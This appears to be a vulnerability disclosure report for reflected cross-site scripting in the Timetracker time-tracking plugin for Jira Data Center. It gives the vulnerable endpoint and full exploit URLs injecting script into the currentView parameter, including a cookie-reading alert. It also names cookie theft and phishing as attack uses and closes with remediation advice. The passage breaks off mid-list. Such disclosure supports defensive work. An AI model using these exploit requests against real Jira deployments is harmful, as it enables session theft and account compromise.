Vulnerability submitted by Shuning Xu
Supplier: https://www.atlassian.com/zh/software/jira
Software download link: https://www.atlassian.com/software/jira/update
Affected software :jira software
Vulnerability plug-in name: timetrackers - Time Tracking & Reporting for Jira
Vulnerability plugin Version: Version 5.2.0•Jira Data Center 9.0.0-9.10.1
Description :jira software download selected HOSTING TYPES to download the latest version of data center 9.10.1 locally to install the Timetracker plug-in. The Timetracker plug-in has XSS vulnerability, that is, cross-site scripting attack. The attacker inserts malicious JavaScript code into the web page (input form, URL, message board, etc.), causing the administrator/user to access the trigger, thus achieving the purpose of the attack. The essential reason is that the server is not strict in filtering the data submitted by the user, resulting in the browser treating the user's input as JS code and directly returning it to the client for execution. What appears here is reflected XSS. Attackers using reflected cross-site scripting attacks can steal cookies from users such as administrators, steal clipboard content, change web content (such as download links), and so on.

Test process:
1. After installing the plug-in timetrackers Time Tracking & Reporting for Jira, the paid plug-in needs to obtain a license and activate the plug-in.
Download address: the page/plugins/servlet/upm/marketplace/featured? source=side_nav_find_new_addons Enter the plug-in name. Timetrackers - Time Tracking & Reporting for Jira download

![image-xss1.1[Timetracker]](images/xss1.1[Timetracker].png)

Or download in the app store at https://marketplace.atlassian.com/apps/1211243/timetracker-time-tracking-reporting-for-jira?hosting=datacenter &tab=overview

![image-xss1.2[Timetracker]](images/xss1.2[Timetracker].png)

2. Navigate to the URL:
http://localhost:port/rest/jttp-rest/latest/calendar/change-date?date=1692611158671&worklogValues=%7B%22startTime%22%3A%22%22%2C%22endTime%22%3A%22%22%2C%22durationTime%22%3A%22%22%2C%22isDuration%22%3Atrue%2C%22comment%22%3A%22%22%2C%22issueKey%22%3A%5B%5D%2C%22period%22%3Afalse%7D&actionWorklogId=$actionWorklogId&editAll=&showMoveAllNoPermission=false&actionFlag=&changeDateType=picker&currentView=month&_=1692611161613

![image-xss1.3[Timetracker]](images/xss1.3[Timetracker].png)

3. Launch Burp Suite to capture network traffic. Use Burpsuite to capture and change packets for detection:
![image-xss1.4[Timetracker]](images/xss1.4[Timetracker].png)

4. Change the currentView parameter to <sCrIpT>alert(1)</sCrIpT> and send the modified url.

/rest/jttp-rest/latest/calendar/change-date?date=1692611158671&worklogValues=%7B%22startTime%22%3A%22%22%2C%22endTime%22%3A%22%22%2C%22durationTime%22%3A%22%22%2C%22isDuration%22%3Atrue%2C%22comment%22%3A%22%22%2C%22issueKey%22%3A%5B%5D%2C%22period%22%3Afalse%7D&actionWorklogId=$actionWorklogId&editAll=&showMoveAllNoPermission=false&actionFlag=&changeDateType=picker&currentView=<sCrIpT>alert(1)</sCrIpT>

Or change the currentView parameter to <sCrIpT>alert(document.cookie)</sCrIpT> and send the modified url.

/rest/jttp-rest/latest/calendar/change-date?date=1692611158671&worklogValues=%7B%22startTime%22%3A%22%22%2C%22endTime%22%3A%22%22%2C%22durationTime%22%3A%22%22%2C%22isDuration%22%3Atrue%2C%22comment%22%3A%22%22%2C%22issueKey%22%3A%5B%5D%2C%22period%22%3Afalse%7D&actionWorklogId=$actionWorklogId&editAll=&showMoveAllNoPermission=false&actionFlag=&changeDateType=picker&currentView=<sCrIpT>alert(document.cookie)</sCrIpT>

5. A pop-up window will appear on the web page, and an alarm box showing 1 will pop up, triggering XSS, indicating that there is cross-site vulnerability, recording the vulnerability, and stopping the test.

![image-xss1.5[Timetracker]](images/xss1.5[Timetracker].png)

A pop-up warning box showing cookies

![image-xss1.6[Timetracker]](images/xss1.6[Timetracker].png)

Attack steps:

1.Attackers create and test malicious URLs;

2.The attacker is sure that the victim loaded a malicious URL in the browser;

3.The attacker uses reflected cross-site scripting attacks to install keyloggers, steal victims' cookies, steal clipboard content, and change web page content (such as download links).

Attack method:

1. Use xss testing platform BlueLotus to steal cookies

2.Malicious links

3. Web phishing

4.Redirection implanted advertisement

Risk level: reflected cross-site presence in the application

Repair solution: 

For XSS cross-site vulnerabilities, the following repair methods can be used:

Overall fix: Validate all input data to effectively detect attacks; properly encode all output data to prevent any successfully injected scripts from running on the browser side. details as follows :

Input Validation: Validate the length, type, syntax, and business rules of all input data using standard input validation mechanisms before a certain data is accepted for display or storage.

Output encoding: Before data output, ensure that the data submitted by the user has been correctly encoded by entity. It is recommended to encode all characters instead of being limited to a certain subset.

Explicitly specify the encoding of the output: don't allow an attacker to choose an encoding (such as ISO 8859-1 or UTF 8) for your users.

Pay attention to the limitations of the blacklist verification method: just find or replace some characters (such as "<" ">" or keywords like "script"), it is easy to bypass the verification mechanism by XSS variant attacks.

Beware of normalization errors: Before validating input, it must be decoded and normalized to conform to the application's current internal representation. Make sure the application does not decode the same input twice. To filter the data submitted by the client, it is generally recommended to filter out special characters such as double quotes ("), angle brackets (<, >), or perform entity conversion on the special characters contained in the data submitted by the client, such as double quotes (") into its entity form &quot;, <corresponding entity form is &lt;, <corresponding entity form is&gt; The following are common characters to be filtered:
